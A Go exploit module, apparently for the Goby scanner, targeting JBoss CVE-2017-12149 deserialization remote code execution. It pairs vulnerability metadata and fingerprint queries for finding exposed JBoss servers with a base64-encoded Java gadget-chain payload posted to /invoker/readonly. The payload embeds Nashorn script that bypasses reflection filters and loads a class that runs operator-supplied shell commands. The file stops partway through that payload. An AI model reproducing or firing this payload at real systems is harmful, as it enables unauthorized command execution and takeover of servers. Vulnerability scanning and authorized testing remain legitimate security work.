package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JBoss readonly Deserialization Remote Code Execution Vulnerability (CVE-2017-12149)",
    "Description": "<p>JBoss is an open-source Java application server used for building and deploying enterprise-level Java applications.</p><p>The vulnerability exists in the ReadOnlyAccessFilter filter of JBoss's HttpInvoker component, where the filter attempts to deserialize data streams from clients without performing any security checks, leading to the emergence of the vulnerability.</p>",
    "Impact": "<p>The vulnerability exists in the ReadOnlyAccessFilter filter of JBoss's HttpInvoker component, where the filter attempts to deserialize data streams from clients without performing any security checks, leading to the emergence of the vulnerability.</p>",
    "Recommendation": "<p>1. Users who do not need the http-invoker.sar component can delete this component directly. </p><p>2. Add the following code to the security-constraint tag of web.xml under http-invoker.sar to control access to the http invoker component: &lt;url-pattern&gt;/*&lt; /url-pattern&gt;</p>",
    "Product": "JBoss",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "JBoss readonly 序列化远程代码执行漏洞（CVE-2017-12149）",
            "Product": "JBoss",
            "Description": "<p>JBoss是一个开源的Java应用服务器，用于构建和部署企业级Java应用程序。</p><p>该漏洞存在于Jboss的HttpInvoker组件中的ReadOnlyAccessFilter过滤器中，该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞的出现。</p>",
            "Recommendation": "<p>目前厂商已经发布了升级补丁已修复这个安全问题，请到厂商的主页下载：<a href=\"https://www.redhat.com/\" target=\"_blank\">https://www.redhat.com/</a></p>",
            "Impact": "<p>该漏洞存在于Jboss的HttpInvoker组件中的ReadOnlyAccessFilter过滤器中，该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞的出现。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "JBoss readonly Deserialization Remote Code Execution Vulnerability (CVE-2017-12149)",
            "Product": "JBoss",
            "Description": "<p>JBoss is an open-source Java application server used for building and deploying enterprise-level Java applications.</p><p>The vulnerability exists in the ReadOnlyAccessFilter filter of JBoss's HttpInvoker component, where the filter attempts to deserialize data streams from clients without performing any security checks, leading to the emergence of the vulnerability.</p>",
            "Recommendation": "<p>1. Users who do not need the http-invoker.sar component can delete this component directly. </p><p>2. Add the following code to the security-constraint tag of web.xml under http-invoker.sar to control access to the http invoker component: &lt;url-pattern&gt;/*&lt; /url-pattern&gt;</p>",
            "Impact": "<p>The vulnerability exists in the ReadOnlyAccessFilter filter of JBoss's HttpInvoker component, where the filter attempts to deserialize data streams from clients without performing any security checks, leading to the emergence of the vulnerability.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "((body=\"Manage this JBoss AS Instance\" || title=\"Welcome to JBoss AS\" || header=\"JBossAS\") && header!=\"couchdb\" && header!=\"ReeCam IP Camera\" && body!=\"couchdb\") || (banner=\"JBossAS\" && banner!=\"couchdb\" && banner!=\"ReeCam IP Camera\") || ((title=\"Welcome to JBoss\" && title!=\"Welcome to JBoss AS\") && header!=\"JBoss-EAP\" && header!=\"couchdb\" && header!=\"drupal\" && header!=\"ReeCam IP Camera\") || (server=\"JBoss\" && header!=\"couchdb\" && header!=\"Routers\" && header!=\"X-Generator: Drupal\" && body!=\"28ze\" && header!=\"ReeCam IP Camera\") || (banner=\"server: JBoss\" && banner!=\"server: JBoss-EAP\" && banner!=\"couchdb\")",
    "GobyQuery": "((body=\"Manage this JBoss AS Instance\" || title=\"Welcome to JBoss AS\" || header=\"JBossAS\") && header!=\"couchdb\" && header!=\"ReeCam IP Camera\" && body!=\"couchdb\") || (banner=\"JBossAS\" && banner!=\"couchdb\" && banner!=\"ReeCam IP Camera\") || ((title=\"Welcome to JBoss\" && title!=\"Welcome to JBoss AS\") && header!=\"JBoss-EAP\" && header!=\"couchdb\" && header!=\"drupal\" && header!=\"ReeCam IP Camera\") || (server=\"JBoss\" && header!=\"couchdb\" && header!=\"Routers\" && header!=\"X-Generator: Drupal\" && body!=\"28ze\" && header!=\"ReeCam IP Camera\") || (banner=\"server: JBoss\" && banner!=\"server: JBoss-EAP\" && banner!=\"couchdb\")",
    "Author": "itardc@163.com",
    "Homepage": "https://www.jboss.org/",
    "DisclosureDate": "2017-10-04",
    "References": [
        "http://www.securityfocus.com/bid/100591",
        "https://access.redhat.com/errata/RHSA-2018:1607",
        "https://access.redhat.com/errata/RHSA-2018:1608",
        "https://bugzilla.redhat.com/show_bug.cgi?id=1486220",
        "https://github.com/gottburgm/Exploits/tree/master/CVE-2017-12149",
        "https://nvd.nist.gov/vuln/detail/CVE-2017-12149",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12149"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2017-12149"
    ],
    "CNVD": [
        "CNVD-2017-33724"
    ],
    "CNNVD": [
        "CNNVD-201709-538"
    ],
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [
            "RedHat-JBoss"
        ],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "9.8",
    "PocId": "10249"
}`

	sendPayloadFlagGlhltf := func(hostinfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewRequestConfig("head", "/invoker/readonly")
		cfg.VerifyTls = false
		data, err := base64.StdEncoding.DecodeString("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAHQAC25ld0luc3RhbmNldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAc3EAfgATdXEAfgAYAAAAAXQAAmpzdAAPZ2V0RW5naW5lQnlOYW1ldXEAfgAbAAAAAXZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHNxAH4AE3VxAH4AGAAAAAF0I7x0cnkgewogIGxvYWQoIm5hc2hvcm46bW96aWxsYV9jb21wYXQuanMiKTsKfSBjYXRjaCAoZSkge30KZnVuY3Rpb24gZ2V0VW5zYWZlKCl7CiAgdmFyIHRoZVVuc2FmZU1ldGhvZCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5VbnNhZmUiKS5nZXREZWNsYXJlZEZpZWxkKCd0aGVVbnNhZmUnKTsKICB0aGVVbnNhZmVNZXRob2Quc2V0QWNjZXNzaWJsZSh0cnVlKTsgCiAgcmV0dXJuIHRoZVVuc2FmZU1ldGhvZC5nZXQobnVsbCk7Cn0KZnVuY3Rpb24gcmVtb3ZlQ2xhc3NDYWNoZShjbGF6eil7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGF6ekFub255bW91c0NsYXNzID0gdW5zYWZlLmRlZmluZUFub255bW91c0NsYXNzKGNsYXp6LGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3MiKS5nZXRSZXNvdXJjZUFzU3RyZWFtKCJDbGFzcy5jbGFzcyIpLnJlYWRBbGxCeXRlcygpLG51bGwpOwogIHZhciByZWZsZWN0aW9uRGF0YUZpZWxkID0gY2xhenpBbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJyZWZsZWN0aW9uRGF0YSIpOwogIHVuc2FmZS5wdXRPYmplY3QoY2xhenosdW5zYWZlLm9iamVjdEZpZWxkT2Zmc2V0KHJlZmxlY3Rpb25EYXRhRmllbGQpLG51bGwpOwp9CmZ1bmN0aW9uIGJ5cGFzc1JlZmxlY3Rpb25GaWx0ZXIoKSB7CiAgdmFyIHJlZmxlY3Rpb25DbGFzczsKICB0cnkgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImpkay5pbnRlcm5hbC5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9IGNhdGNoIChlcnJvcikgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoInN1bi5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGFzc0J1ZmZlciA9IHJlZmxlY3Rpb25DbGFzcy5nZXRSZXNvdXJjZUFzU3RyZWFtKCJSZWZsZWN0aW9uLmNsYXNzIikucmVhZEFsbEJ5dGVzKCk7CiAgdmFyIHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcyA9IHVuc2FmZS5kZWZpbmVBbm9ueW1vdXNDbGFzcyhyZWZsZWN0aW9uQ2xhc3MsIGNsYXNzQnVmZmVyLCBudWxsKTsKICB2YXIgZmllbGRGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJmaWVsZEZpbHRlck1hcCIpOwogIHZhciBtZXRob2RGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJtZXRob2RGaWx0ZXJNYXAiKTsKICBpZiAoZmllbGRGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQoZmllbGRGaWx0ZXJNYXBGaWVsZCksIGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpLmdldENvbnN0cnVjdG9yKCkubmV3SW5zdGFuY2UoKSk7CiAgfQogIGlmIChtZXRob2RGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQobWV0aG9kRmlsdGVyTWFwRmllbGQpLCBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKS5nZXRDb25zdHJ1Y3RvcigpLm5ld0luc3RhbmNlKCkpOwogIH0KICByZW1vdmVDbGFzc0NhY2hlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3MiKSk7Cn0KZnVuY3Rpb24gc2V0QWNjZXNzaWJsZShhY2Nlc3NpYmxlT2JqZWN0KXsKICAgIHZhciB1bnNhZmUgPSBnZXRVbnNhZmUoKTsKICAgIHZhciBvdmVycmlkZUZpZWxkID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubGFuZy5yZWZsZWN0LkFjY2Vzc2libGVPYmplY3QiKS5nZXREZWNsYXJlZEZpZWxkKCJvdmVycmlkZSIpOwogICAgdmFyIG9mZnNldCA9IHVuc2FmZS5vYmplY3RGaWVsZE9mZnNldChvdmVycmlkZUZpZWxkKTsKICAgIHVuc2FmZS5wdXRCb29sZWFuKGFjY2Vzc2libGVPYmplY3QsIG9mZnNldCwgdHJ1ZSk7Cn0KZnVuY3Rpb24gZGVmaW5lQ2xhc3MoYnl0ZXMpewogIHZhciBjbHogPSBudWxsOwogIHZhciB2ZXJzaW9uID0gamF2YS5sYW5nLlN5c3RlbS5nZXRQcm9wZXJ0eSgiamF2YS52ZXJzaW9uIik7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpCiAgdmFyIGNsYXNzTG9hZGVyID0gbmV3IGphdmEubmV0LlVSTENsYXNzTG9hZGVyKGphdmEubGFuZy5yZWZsZWN0LkFycmF5Lm5ld0luc3RhbmNlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLm5ldC5VUkwiKSwgMCkpOwogIHRyeXsKICAgIGlmICh2ZXJzaW9uLnNwbGl0KCIuIilbMF0gPj0gMTEpIHsKICAgICAgYnlwYXNzUmVmbGVjdGlvbkZpbHRlcigpOwogICAgZGVmaW5lQ2xhc3NNZXRob2QgPSBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5sYW5nLkNsYXNzTG9hZGVyIikuZ2V0RGVjbGFyZWRNZXRob2QoImRlZmluZUNsYXNzIiwgamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoIltCIiksamF2YS5sYW5nLkludGVnZXIuVFlQRSwgamF2YS5sYW5nLkludGVnZXIuVFlQRSk7CiAgICBzZXRBY2Nlc3NpYmxlKGRlZmluZUNsYXNzTWV0aG9kKTsKICAgIC8vIOe7lei/hyBzZXRBY2Nlc3NpYmxlIAogICAgY2x6ID0gZGVmaW5lQ2xhc3NNZXRob2QuaW52b2tlKGNsYXNzTG9hZGVyLCBieXRlcywgMCwgYnl0ZXMubGVuZ3RoKTsKICAgIH1lbHNlewogICAgICB2YXIgcHJvdGVjdGlvbkRvbWFpbiA9IG5ldyBqYXZhLnNlY3VyaXR5LlByb3RlY3Rpb25Eb21haW4obmV3IGphdmEuc2VjdXJpdHkuQ29kZVNvdXJjZShudWxsLCBqYXZhLmxhbmcucmVmbGVjdC5BcnJheS5uZXdJbnN0YW5jZShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5zZWN1cml0eS5jZXJ0LkNlcnRpZmljYXRlIiksIDApKSwgbnVsbCwgY2xhc3NMb2FkZXIsIFtdKTsKICAgICAgY2x6ID0gdW5zYWZlLmRlZmluZUNsYXNzKG51bGwsIGJ5dGVzLCAwLCBieXRlcy5sZW5ndGgsIGNsYXNzTG9hZGVyLCBwcm90ZWN0aW9uRG9tYWluKTsKICAgIH0KICB9Y2F0Y2goZXJyb3IpewogICAgZXJyb3IucHJpbnRTdGFja1RyYWNlKCk7CiAgfWZpbmFsbHl7CiAgICByZXR1cm4gY2x6OwogIH0KfQpmdW5jdGlvbiBiYXNlNjREZWNvZGVUb0J5dGUoc3RyKSB7CiAgdmFyIGJ0OwogIHRyeSB7CiAgICBidCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIikubmV3SW5zdGFuY2UoKS5kZWNvZGVCdWZmZXIoc3RyKTsKICB9IGNhdGNoIChlKSB7CiAgICBidCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0IikubmV3SW5zdGFuY2UoKS5nZXREZWNvZGVyKCkuZGVjb2RlKHN0cik7CiAgfQogIHJldHVybiBidDsKfQp2YXIgY29kZT0ieXY2NnZnQUFBRElBN1FvQUNRQmxDZ0JtQUdjS0FHWUFhQWdBYVFvQWFnQnJDQUJzQndCdEJ3QnVCd0J2Q0FCd0NnQkxBSEVJQUhJSUFITUtBQWtBZEFvQUNBQjFDZ0JMQUhZSUFIY0tBQWNBZUFnQWVRZ0FlZ2NBZXdvQUNBQjhDZ0FWQUgwS0FCVUFmZ2NBZndnQWdBb0FDUUNCQ0FDQ0NnQUhBSU1LQUlRQWhRb0FoQUNHQ0FDSENBQ0lDQUNKQ0FDS0J3Q0xDZ0FrQUl3SUFJMEtBQWdBamdnQWp3b0FrQUNSQ2dBSUFKSUtBQWdBa3dnQWxBb0FDQUNWQ0FDV0NBQ1hCd0NZQ2dBd0FHVUtBREFBbVFnQW1nb0FNQUIwQ0FDYkNBQ2NDQUNkQ0FDZUNnQ2ZBS0FLQUo4QW9RY0FvZ29Bb3dDa0NnQTdBS1VJQUtZS0FEc0Fwd29BT3dDb0NnQTdBS2tLQUtNQXFnb0Fvd0NyQ2dBa0FIUUlBS3dLQUFjQXJRb0FyZ0NGQ2dBSEFLOEtBRXNBc0FvQXJnQ3hCd0N5QVFBR1BHbHVhWFErQVFBREtDbFdBUUFFUTI5a1pRRUFEMHhwYm1WT2RXMWlaWEpVWVdKc1pRRUFEVk4wWVdOclRXRndWR0ZpYkdVSEFMSUhBRzhIQUc0SEFIOEhBSXNCQUFSbGVHVmpBUUFtS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzSEFMTUhBTFFIQUtJSEFKZ0hBTFVCQUJCblpYUk5aWFJvYjJSQ2VVTnNZWE56QVFCUktFeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN1cweHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0tVeHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOU5aWFJvYjJRN0J3QzJBUUFTWjJWMFRXVjBhRzlrUVc1a1NXNTJiMnRsQVFCZEtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME8weHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk8xdE1hbUYyWVM5c1lXNW5MME5zWVhOek8xdE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdCd0J0QVFBS1UyOTFjbU5sUm1sc1pRRUFDRXBGTVM1cVlYWmhEQUJNQUUwSEFMY01BTGdBdVF3QXVnQzdBUUFoYW1GMllYZ3VjMlZqZFhKcGRIa3VhbUZqWXk1UWIyeHBZM2xEYjI1MFpYaDBCd0M4REFDOUFMNEJBQXBuWlhSRGIyNTBaWGgwQVFBUGFtRjJZUzlzWVc1bkwwTnNZWE56QVFBUWFtRjJZUzlzWVc1bkwxTjBjbWx1WndFQUVHcGhkbUV2YkdGdVp5OVBZbXBsWTNRQkFDVnFZWFpoZUM1elpYSjJiR1YwTG1oMGRIQXVTSFIwY0ZObGNuWnNaWFJTWlhGMVpYTjBEQUJnQUdFQkFBbG5aWFJJWldGa1pYSUJBQU5qYldRTUFMOEF3QXdBd1FEQ0RBQldBRmNCQUM5cGJ5NTFibVJsY25SdmR5NXpaWEoyYkdWMExuTndaV011U0hSMGNGTmxjblpzWlhSU1pYRjFaWE4wU1cxd2JBd0F3d0MrQVFBTFoyVjBSWGhqYUdGdVoyVUJBQTluWlhSUGRYUndkWFJUZEhKbFlXMEJBQlJxWVhaaEwybHZMMDkxZEhCMWRGTjBjbVZoYlF3QXhBREZEQUNJQU1ZTUFJb0FUUUVBSUdwaGRtRXZiR0Z1Wnk5RGJHRnpjMDV2ZEVadmRXNWtSWGhqWlhCMGFXOXVBUUFMWjJWMFVtVnpjRzl1YzJVTUFNY0F5QUVBQjNKbGNYVmxjM1FNQU1rQXlnY0F5d3dBekFETkRBRE9BTThCQUFsblpYUlhjbWwwWlhJQkFBVjNjbWwwWlFFQUJXWnNkWE5vQVFBRlkyeHZjMlVCQUJOcVlYWmhMMnhoYm1jdlJYaGpaWEIwYVc5dURBRFFBRTBCQUFBTUFORUEwZ0VBQjI5ekxtNWhiV1VIQU5NTUFOUUFWd3dBMVFEQURBRFdBTUFCQUFOM2FXNE1BTmNBMkFFQUJIQnBibWNCQUFJdGJnRUFGMnBoZG1FdmJHRnVaeTlUZEhKcGJtZENkV2xzWkdWeURBRFpBTm9CQUFVZ0xXNGdOQUVBQWk5akFRQUZJQzEwSURRQkFBSnphQUVBQWkxakJ3RGJEQURjQU4wTUFGWUEzZ0VBRVdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5QndDekRBRGZBT0FNQUV3QTRRRUFBbHhoREFEaUFPTU1BT1FBd2d3QTVRREFEQURtQU9BTUFPY0FUUUVBRUdOdmJXMWhibVFnYm05MElHNTFiR3dNQU9nQTZRY0F0Z3dBNmdESURBQmRBRjRNQU9zQTdBRUFBMHBGTVFFQUVXcGhkbUV2YkdGdVp5OVFjbTlqWlhOekFRQVRXMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBRTJwaGRtRXZiR0Z1Wnk5VWFISnZkMkZpYkdVQkFCaHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOU5aWFJvYjJRQkFCQnFZWFpoTDJ4aGJtY3ZWR2h5WldGa0FRQU5ZM1Z5Y21WdWRGUm9jbVZoWkFFQUZDZ3BUR3BoZG1FdmJHRnVaeTlVYUhKbFlXUTdBUUFWWjJWMFEyOXVkR1Y0ZEVOc1lYTnpURzloWkdWeUFRQVpLQ2xNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU93RUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2dFQUNXeHZZV1JEYkdGemN3RUFKU2hNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNCQUFoMGIxTjBjbWx1WndFQUZDZ3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFIYVhORmJYQjBlUUVBQXlncFdnRUFCMlp2Y2s1aGJXVUJBQWhuWlhSQ2VYUmxjd0VBQkNncFcwSUJBQVVvVzBJcFZnRUFDR2RsZEVOc1lYTnpBUUFUS0NsTWFtRjJZUzlzWVc1bkwwTnNZWE56T3dFQUVHZGxkRVJsWTJ4aGNtVmtSbWxsYkdRQkFDMG9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2Y21WbWJHVmpkQzlHYVdWc1pEc0JBQmRxWVhaaEwyeGhibWN2Y21WbWJHVmpkQzlHYVdWc1pBRUFEWE5sZEVGalkyVnpjMmxpYkdVQkFBUW9XaWxXQVFBRFoyVjBBUUFtS0V4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsTWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzQkFBOXdjbWx1ZEZOMFlXTnJWSEpoWTJVQkFBWmxjWFZoYkhNQkFCVW9UR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVm9CQUJCcVlYWmhMMnhoYm1jdlUzbHpkR1Z0QVFBTFoyVjBVSEp2Y0dWeWRIa0JBQXQwYjB4dmQyVnlRMkZ6WlFFQUJIUnlhVzBCQUFoamIyNTBZV2x1Y3dFQUd5aE1hbUYyWVM5c1lXNW5MME5vWVhKVFpYRjFaVzVqWlRzcFdnRUFCbUZ3Y0dWdVpBRUFMU2hNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWRDZFdsc1pHVnlPd0VBRVdwaGRtRXZiR0Z1Wnk5U2RXNTBhVzFsQVFBS1oyVjBVblZ1ZEdsdFpRRUFGU2dwVEdwaGRtRXZiR0Z1Wnk5U2RXNTBhVzFsT3dFQUtDaGJUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2VUhKdlkyVnpjenNCQUE1blpYUkpibkIxZEZOMGNtVmhiUUVBRnlncFRHcGhkbUV2YVc4dlNXNXdkWFJUZEhKbFlXMDdBUUFZS0V4cVlYWmhMMmx2TDBsdWNIVjBVM1J5WldGdE95bFdBUUFNZFhObFJHVnNhVzFwZEdWeUFRQW5LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOTFkR2xzTDFOallXNXVaWEk3QVFBSGFHRnpUbVY0ZEFFQUJHNWxlSFFCQUE1blpYUkZjbkp2Y2xOMGNtVmhiUUVBQjJSbGMzUnliM2tCQUJGblpYUkVaV05zWVhKbFpFMWxkR2h2WkFFQVFDaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6dGJUR3BoZG1FdmJHRnVaeTlEYkdGemN6c3BUR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMDFsZEdodlpEc0JBQTFuWlhSVGRYQmxjbU5zWVhOekFRQUdhVzUyYjJ0bEFRQTVLRXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPMXRNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3QUNFQVN3QUpBQUFBQUFBRUFBRUFUQUJOQUFFQVRnQUFBZDBBQndBSEFBQUJIeXEzQUFHNEFBSzJBQU1TQkxZQUJSSUdCTDBBQjFrREVnaFRCTDBBQ1ZrREVncFR1QUFMVENzU0RBUzlBQWRaQXhJSVV3UzlBQWxaQXhJTlU3Z0FDN1lBRGswc3hnRFNMTFlBRDVvQXl5b3N0Z0FRVGhJUnVBQVNWeXNTRXdPOUFBY0R2UUFKdUFBTE9nUVpCQklVQTcwQUJ3TzlBQW00QUF2QUFCVTZCUmtGTGJZQUZyWUFGeGtGdGdBWXB3Q0tPZ1FyRWhvRHZRQUhBNzBBQ2JnQUN6b0ZHUVhIQUNrcnRnQWJFaHkyQUIwNkJoa0dCTFlBSGhrR0s3WUFIeElhQTcwQUJ3TzlBQW00QUFzNkJSa0ZFaUFEdlFBSEE3MEFDYmdBQ3pvR0dRWVNJUVM5QUFkWkF4SUlVd1M5QUFsWkF5MVR1QUFMVnhrR0VpSUR2UUFIQTcwQUNiZ0FDMWNaQmhJakE3MEFCd085QUFtNEFBdFhwd0FJVEN1MkFDV3hBQUlBVkFDTUFJOEFHUUFFQVJZQkdRQWtBQUlBVHdBQUFHWUFHUUFBQUFzQUJBQU9BQ2NBRHdCREFCQUFUZ0FSQUZRQUZBQmFBQlVBYWdBV0FINEFGd0NIQUJnQWpBQWxBSThBR1FDUkFCb0FvUUFiQUtZQUhBQ3hBQjBBdHdBZUFNd0FJUURkQUNJQTlnQWpBUVlBSkFFV0FDa0JHUUFuQVJvQUtBRWVBQ29BVUFBQUFEQUFCZjhBandBRUJ3QlJCd0JTQndCVEJ3QlRBQUVIQUZUOUFEd0hBRlFIQUZML0FFa0FBUWNBVVFBQVFnY0FWUVFBQVFCV0FGY0FBUUJPQUFBQ3NnQUVBQWtBQUFFNks4WUJOaEltSzdZQUo1b0JMUklvdUFBcHRnQXFUU3UyQUN0TUFVNEJPZ1FzRWl5MkFDMlpBRUFyRWk2MkFDMlpBQ0FyRWkrMkFDMmFBQmU3QURCWnR3QXhLN1lBTWhJenRnQXl0Z0EwVEFhOUFBaFpBeElOVTFrRUVqVlRXUVVyVXpvRXB3QTlLeEl1dGdBdG1RQWdLeEl2dGdBdG1nQVh1d0F3V2JjQU1TdTJBRElTTnJZQU1yWUFORXdHdlFBSVdRTVNOMU5aQkJJNFUxa0ZLMU02QkxnQU9Sa0V0Z0E2VHJzQU8xa3R0Z0E4dHdBOUVqN